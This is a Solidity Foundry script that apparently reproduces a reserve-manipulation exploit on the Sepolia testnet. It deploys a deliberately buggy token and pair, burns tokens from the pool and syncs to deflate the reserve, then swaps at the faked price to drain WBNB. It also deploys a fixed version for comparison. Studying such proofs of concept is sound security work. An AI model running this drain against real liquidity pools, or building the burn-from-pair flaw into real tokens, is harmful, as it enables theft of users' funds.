// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Script.sol";
import {MockWBNB} from "../src/MockWBNB.sol";
import {Pair} from "../src/Pair.sol";
import {AidcTokenBuggy} from "../src/AidcTokenBuggy.sol";
import {AidcTokenFixed} from "../src/AidcTokenFixed.sol";
// Deploys the reserve-manipulation demo on Sepolia and runs the LIVE drain (burn-from-pair + sync).
contract DeploySepolia is Script {
    uint256 constant POOL=1_000_000 ether; uint256 constant ATK=10_000 ether; uint256 constant BURN=990_000 ether;
    function run() external {
        uint256 pk=vm.envUint("PRIVATE_KEY"); address me=vm.addr(pk);
        vm.startBroadcast(pk);
        MockWBNB wbnb=new MockWBNB();
        AidcTokenBuggy aidc=new AidcTokenBuggy();
        Pair pair=new Pair(address(aidc),address(wbnb));
        aidc.mint(address(pair),POOL); wbnb.mint(address(pair),100 ether); pair.sync();
        aidc.mint(me,ATK);
        // --- LIVE ATTACK ---
        aidc.executeAccumulatedBurn(address(pair),BURN);   // burn AIDC from the POOL + sync -> deflate reserve
        uint256 got=pair.swapAidcForWbnb(ATK);             // swap at the faked price -> drain WBNB
        // FIXED side (for the on-chain revert demo)
        AidcTokenFixed aidcFix=new AidcTokenFixed();
        Pair pairFix=new Pair(address(aidcFix),address(wbnb));
        aidcFix.mint(address(pairFix),POOL); wbnb.mint(address(pairFix),100 ether); pairFix.sync();
        aidcFix.mint(me,ATK);
        vm.stopBroadcast();
        console.log("WBNB          ", address(wbnb));
        console.log("AidcTokenBuggy", address(aidc));
        console.log("Pair          ", address(pair));
        console.log("AidcTokenFixed", address(aidcFix));
        console.log("PairFixed     ", address(pairFix));
        console.log("Attacker      ", me);
        console.log("WBNB drained  ", got/1e18);
    }
}
